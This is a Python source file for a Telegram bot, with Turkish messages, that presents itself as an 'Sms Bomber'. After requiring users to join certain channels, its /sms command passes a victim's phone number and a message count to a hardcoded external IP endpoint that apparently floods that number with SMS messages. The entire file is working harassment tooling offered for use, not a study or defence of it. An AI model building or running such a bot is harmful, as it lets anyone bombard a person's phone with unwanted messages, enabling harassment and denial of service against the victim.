import asyncio
import json
from aiogram import Bot, Dispatcher, types, html
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import ClientSession

# Telegram bot token
TOKEN = input("Token: ")
# Telegram channel username
CHANNEL_USERNAME = input("Channel Username: ")

# Create bot and dispatcher
bot = Bot(token=TOKEN)
dp = Dispatcher()

# HTTP GET request function
async def http_get(url, params=None):
    async with ClientSession() as session:
        async with session.get(url, params=params) as response:
            return await response.text()

# Send message function
async def send_message(chat_id, message):
    await bot.send_message(chat_id=chat_id, text=message)

# Start keyboard
start_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text='Kanal', url=f't.me/{CHANNEL_USERNAME}')],
    [InlineKeyboardButton(text='Kanal', url='t.me/VoleriaArsiv')]
])

# Check subscription function
async def check_sub(username, user_id):
    try:
        member = await bot.get_chat_member(chat_id=f'@{username}', user_id=user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

# Handle updates
@dp.message(Command('start'))
async def handle_start(message: types.Message):
    user = message.from_user
    if await check_sub(CHANNEL_USERNAME, user.id):
        await send_message(message.chat.id, f"Merhaba {html.bold(user.first_name)}, Sms Bomber yapmak için /sms ‹numara› ‹miktar›")
    else:
        await bot.send_message(chat_id=message.chat.id, text='Botu kullanmak için kanallara katılmanız gerekiyor.', reply_markup=start_keyboard)

@dp.message(Command('sms'))
async def handle_sms(message: types.Message):
    args = message.text.split()
    try:
        number = int(args[1])
        amount = int(args[2])
    except (IndexError, ValueError):
        await send_message(message.chat.id, "Geçersiz numara veya miktar.")
        return
    await http_get(f"http://172.208.52.218/api/legaliapi/smsvip.php?number={number}&adet={amount}")
    await send_message(message.chat.id, "👍 :)")

# Run the bot
async def main():
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())